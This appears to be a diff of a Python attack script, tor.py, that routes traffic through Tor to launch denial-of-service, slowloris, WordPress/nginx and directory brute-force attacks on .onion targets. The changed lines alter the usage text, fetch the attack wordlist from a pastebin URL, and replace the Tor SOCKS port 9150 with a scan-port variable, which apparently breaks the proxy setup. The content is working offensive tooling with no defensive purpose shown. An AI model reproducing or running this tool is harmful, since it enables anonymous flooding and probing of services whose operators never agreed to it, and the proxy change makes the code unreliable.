@@ -176,7 +176,7 @@ def linkgrab(target):
 
 def pscan(target1, i, port):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150, True)
+  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port, True)
   s = socks.socksocket()
   try:
     con = s.connect((target1, i))
@@ -222,7 +222,7 @@ def threads(type, num, args1, args2):
 def usage():
   print("""
   usage: 
-    DoS: python tor.py -u http://target.onion/ -t 100 -c 100
+    DoS: python tor.py -u http://target.onion/ -t 100 or -c 100
     Wordpress/nginx/slowloris/: python tor.py -u http://target.onion/ -t 100 -a {} -c 100
     """)
   exit()
@@ -261,7 +261,7 @@ print(Fore.GREEN + '  Server: ' + responce.headers.get('Server'))
 print(Fore.GREEN + '  Exit node: ' +  exitnode + '\n')
 
 if(attack == '1'):
-  data = requests.get('https://raw.githubusercontent.com/abaykan/CrawlBox/master/list.txt', headers=headers, proxies=proxies).text
+  data = requests.get('http://pastebin.com/raw/QwjrgKj2', headers=headers, proxies=proxies).text
   for x in re.split(r'\s+', data):
     checkdirec(x)
 elif(attack == '2'):
@@ -328,4 +328,4 @@ try:
     time.sleep(2)
     pass
 except KeyboardInterrupt:
-  print(Fore.WHITE + '\nDone')
+  print(Fore.WHITE + '  \nDone')
